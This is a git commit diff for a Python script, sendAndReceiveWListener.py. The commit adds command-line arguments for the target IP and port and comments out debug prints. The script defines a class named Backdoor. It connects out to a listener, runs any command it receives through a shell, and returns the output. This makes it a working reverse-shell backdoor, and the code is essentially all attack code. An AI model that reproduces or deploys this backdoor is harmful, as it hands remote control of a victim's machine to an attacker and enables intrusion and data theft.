def07e154ca4ab073d9b3c386f9740ab9ac2ec80
benrobbins20 <benro221120@gmail.com>
2022-03-03 14:21:40 -0700

    added argparse

--- sendAndReceiveWListener.py
+++ sendAndReceiveWListener.py
@@ -1,15 +1,26 @@
-import subprocess, sys, socket, json
+import subprocess, sys, socket, json, argparse
+
+class Args:
+    def __init__(self):
+        parser = argparse.ArgumentParser()
+        parser.add_argument('-i','--IP',dest = 'ip', help = 'Enter target IP address.')
+        parser.add_argument('-p','--port',dest = 'port', help = 'Enter target port.')     
+        parser.set_defaults(port = 1337)
+        options = parser.parse_args()
+        self.ip = options.ip
+        self.port = options.port
 
 
 class Backdoor:
     def __init__(self,ip,port):
         self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         try:
-            self.connection.connect((str(ip),port))
+            self.connection.connect((str(ip),int(port)))
         except ConnectionRefusedError:
             sys.exit()
         
-    
+  
+
     def executeCmd(self,cmd):
         cmd = subprocess.check_output(cmd,shell=True)
         return cmd
@@ -34,21 +45,21 @@ class Backdoor:
 
     def run(self):
         while True:
-            print('run1')
+            #print('run1')
             cmdIn = self.recvStream()
-            print(cmdIn)
-            print('run1')
+            #print(cmdIn)
+            #print('run1')
             #cmdIn = cmdIn.decode()
             #print(cmdIn)
             try:
-                print('run3_TRY')
+                #print('run3_TRY')
                 cmdOut = self.executeCmd(cmdIn)
-                print('run4_TRY')
-                print(cmdOut)
+                #print('run4_TRY')
+                #print(cmdOut)
                 cmdOut = cmdOut.decode('utf-8')
-                print(cmdOut)
+                #print(cmdOut)
                 self.sendStream(cmdOut)
-                print('run5_TRYPOSTSEND')
+                #print('run5_TRYPOSTSEND')
             except subprocess.CalledProcessError:
                 self.sendStream('Subprocess Error, shell command not accepted by target')
 
@@ -57,7 +68,8 @@ class Backdoor:
 
 
 try:
-    backdoor = Backdoor('192.168.241.133',4444)
+    args = Args()
+    backdoor = Backdoor(args.ip,args.port)
     backdoor.run()
 except KeyboardInterrupt:
     sys.exit()
